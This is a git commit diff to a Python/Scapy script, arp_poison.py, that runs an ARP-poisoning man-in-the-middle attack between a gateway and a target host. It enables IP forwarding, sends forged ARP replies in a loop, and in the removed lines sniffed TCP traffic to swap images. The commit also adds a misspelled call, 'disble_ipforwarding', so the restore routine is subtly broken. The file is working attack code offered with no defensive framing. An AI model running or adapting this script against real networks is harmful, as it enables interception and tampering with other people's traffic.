bfd0d304b64af02ee2f7f5b76842d4816190b982
Aliona Dangla <aliona.dangla@outlook.fr>
2019-05-30 00:07:30 +0200

    Remove lo conf, use format for strings, disable ip forwarding before exit, add layer 2 when sendind packets

--- arp_poison.py
+++ arp_poison.py
@@ -5,11 +5,9 @@ import sys
 import threading
 import time
 
-gw_ip = "192.168.0.2"
-target_ip = "192.168.0.3"
+gw_ip = "192.168.1.1"
+target_ip = "192.168.1.27"
 broadcast = "ff:ff:ff:ff:ff:ff"
-
-conf.iface = "lo"
 
 def swap_img(pkt):
     if pkt.haslayer(TCP):
@@ -32,6 +30,9 @@ def get_mac_l3(ip_addr):
 def restore_network(gw_ip, gw_mac, target_ip, target_mac):
     send(ARP(op=2, hwdst=broadcast, pdst=gw_ip, hwsrc=target_mac, psrc=target_ip), count=5)
     send(ARP(op=2, hwdst=broadcast, pdst=target_ip, hwsrc=gw_mac, psrc=gw_ip), count=5)
+    disble_ipforwarding()
+
+def disable_ipforwarding():
     print('[*] Disable IP forwarding')
     os.system('sysctl -w net.ipv4.ip_forward=0')
     os.kill(os.getpid(), signal.SIGTERM)
@@ -40,8 +41,8 @@ def arp_poison(gw_ip, gw_mac, target_ip, target_mac):
     print('[*] Started ARP poison attack [CTRL-C to stop]')
     try:
         while True:
-            send(ARP(op=2, pdst=gw_ip, hdst=gw_mac, psrc=target_ip))
-            send(ARP(op=2, pdst=target_ip, hdst=target_mac, psrc=gw_ip))
+            sendp(Ether(dst=target_mac)/ARP(op=2, pdst=gw_ip, hdst=gw_mac, psrc=target_ip))
+            sendp(Ether(dst=gw_mac)/ARP(op=2, pdst=target_ip, hdst=target_mac, psrc=gw_ip))
             time.sleep(2)
     except KeyboardInterrupt:
         print('[*] Stopped ARP poison, restoring...')
@@ -50,33 +51,24 @@ def arp_poison(gw_ip, gw_mac, target_ip, target_mac):
 print('[*] Start script')
 print('[*] Enabling IP forwarding')
 os.system('sysctl -w net.ipv4.ip_forward=1')
-print(f'[*] Gateway IP: {gw_ip}')
-print(f'[*] Target IP: {target_ip}')
+print('[*] Gateway IP: {gw_ip}'.format(gw_ip=gw_ip))
+print('[*] Target IP: {target_ip}'.format(target_ip=target_ip))
 
 gw_mac = get_mac_l3(gw_ip)
 if gw_mac is None:
     print('[!] Unable to get gateway MAC address. Exiting.')
+    disable_ipforwarding()
     sys.exit(0)
 else:
-    print(f'[*] Gateway MAC: {gw_mac}')
+    print('[*] Gateway MAC: {gw_mac}'.format(gw_mac=gw_mac))
 
 target_mac = get_mac_l3(target_ip)
 if target_mac is None:
     print('[!] Unable to get target MAC address. Exiting.')
+    disable_ipforwarding()
     sys.exit(0)
 else:
-    print(f'[*] Target MAC: {target_mac}')
+    print('[*] Target MAC: {target_mac}'.format(target_mac=target_mac))
 
-poison_thread = threading.Thread(target=arp_poison, args=(gw_ip, gw_mac, target_ip, target_mac))
-poison_thread.start()
-
-try:
-    print('[*] Starting freeze')
-    res = sniff(lfilter = lambda x: x.haslayer(TCP) and x[TCP].flags & PSH and x[TCP].flags & ACK, count=1)
-    img = res[0][Raw]
-    sniff(prn=swap_img)
-except KeyboardInterrupt:
-    print('[*] Stopped capture, restoring...')
-    restore_network(gw_ip, gw_mac, target_ip, target_mac)
-
+arp_poison(gw_ip, gw_mac, target_ip, target_mac)
 
